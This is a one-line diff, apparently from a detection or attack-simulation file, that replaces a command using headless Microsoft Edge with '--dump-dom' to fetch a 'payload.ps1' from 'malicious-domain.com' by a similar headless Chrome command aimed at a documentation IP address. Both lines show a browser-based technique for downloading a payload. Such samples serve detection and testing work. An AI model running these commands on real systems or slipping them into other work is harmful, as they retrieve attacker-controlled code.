@@ -1,1 +1,1 @@
-msedge.exe --headless --dump-dom http://malicious-domain.com/payload.ps1
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --dump-dom http://192.0.2.10
